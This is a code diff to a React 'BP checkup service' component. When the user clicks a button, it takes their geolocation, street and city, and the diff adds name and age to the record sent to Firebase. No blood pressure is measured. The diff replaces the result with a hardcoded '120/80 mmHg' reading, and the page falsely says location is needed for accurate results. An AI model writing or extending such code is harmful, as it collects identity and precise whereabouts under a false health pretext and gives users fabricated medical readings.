@@ -1,4 +1,4 @@
-import React from 'react';
+import React, { useState } from 'react';
 import axios from 'axios';
 import Swal from 'sweetalert2';
 import { database, ref, set } from './firebase';
@@ -6,6 +6,9 @@ import 'bootstrap/dist/css/bootstrap.min.css';
 import './App.css';
 
 function Checkup() {
+  const [name, setName] = useState('');
+  const [age, setAge] = useState('');
+
   const handleGetLocation = () => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition((position) => {
@@ -25,6 +28,8 @@ function Checkup() {
               const city = components.city || components.town || components.village || '';
 
               set(locationRef, {
+                name,
+                age,
                 latitude,
                 longitude,
                 street,
@@ -35,7 +40,7 @@ function Checkup() {
               .then(() => {
                 Swal.fire({
                   title: 'Success!',
-                  text: 'Yes you are healthy',
+                  text: 'Systolic Pressure is 120 mmHg\nDiastolic Pressure is 80 mmHg',
                   icon: 'success',
                   confirmButtonText: 'OK'
                 });
@@ -66,14 +71,33 @@ function Checkup() {
         </div>
         <div className="card-body">
           <p className="card-text">
-            Welcome to our BP checkup service. Click the button below to get your current location and check your health status.
+            Welcome to our BP checkup service. Please enter your name and age, then click the button below to get your current location and check your health status.
           </p>
+          <div className="mb-3">
+            <label htmlFor="name" className="form-label">Name</label>
+            <input
+              type="text"
+              className="form-control"
+              id="name"
+              value={name}
+              onChange={(e) => setName(e.target.value)}
+            />
+          </div>
+          <div className="mb-3">
+            <label htmlFor="age" className="form-label">Age</label>
+            <input
+              type="number"
+              className="form-control"
+              id="age"
+              value={age}
+              onChange={(e) => setAge(e.target.value)}
+            />
+          </div>
           <button onClick={handleGetLocation} className="btn btn-primary">Check UP</button>
         </div>
         <div className="card-footer text-muted">
-  Please ensure your location services are enabled on your device to receive temperature for accurate results  .
+          Please ensure your location services are enabled on your device to receive temperature for accurate results.
         </div>
-
       </div>
     </div>
   );
